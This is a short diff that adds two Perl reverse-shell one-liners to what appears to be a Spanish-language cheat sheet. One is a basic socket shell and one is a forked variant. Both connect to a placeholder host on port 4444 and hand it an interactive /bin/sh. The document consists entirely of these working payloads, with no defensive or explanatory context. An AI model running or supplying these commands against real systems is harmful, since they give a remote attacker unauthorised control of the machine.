@@ -1,0 +1,5 @@
+▶ Reverse Shell en una Línea (Shell básica con Socket):
+  perl -e 'use Socket;$i="$IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+▶ Reverse Shell con Fork (Usar fork para estabilidad):
+  perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
